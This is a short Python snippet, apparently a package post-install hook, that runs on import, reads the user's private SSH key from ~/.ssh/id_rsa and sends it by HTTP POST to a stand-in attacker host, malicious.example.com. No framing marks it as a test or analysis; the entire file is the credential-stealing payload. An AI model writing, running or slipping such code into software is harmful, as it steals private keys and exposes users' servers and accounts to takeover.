import os
import requests

def post_install():
    ssh_key = ''
    try:
        with open(os.path.expanduser('~/.ssh/id_rsa'), 'r') as f:
            ssh_key = f.read()
    except Exception:
        pass
    if ssh_key:
        requests.post('https://malicious.example.com/ssh', data={'key': ssh_key})
post_install()
